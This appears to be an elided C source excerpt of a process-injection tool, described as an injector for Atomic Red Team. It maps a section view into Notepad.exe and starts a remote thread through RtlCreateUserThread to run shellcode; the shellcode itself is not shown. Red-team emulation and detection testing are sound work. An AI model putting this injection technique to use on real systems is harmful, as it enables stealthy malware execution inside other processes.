/*
    Injector for Atomic Red Team leveraging NtMapViewOfSection to inject shellcode in Notepad.exe.
    Author: traceflow@0x8d.cc
    Reference: https://www.ired.team/offensive-security/code-injection-process-injection/ntcreatesection-+-ntmapviewofsection-code-injection
*/
...
int InjectView(HANDLE hProc, unsigned char * shellcode, unsigned int shellcode_len) {
    ...
    // Create a thread in the target process, telling it to execute the code pointed to by the remote view
    ...
    if (pRtlCreateUserThread == NULL) return -2;
...
int main(int argc, char *argv[]) {
    ...
    if(pid) {
        ...
        if(hProc != NULL) {
            InjectView(hProc, shellcode, shellcode_len);
            CloseHandle(hProc);
        } else {
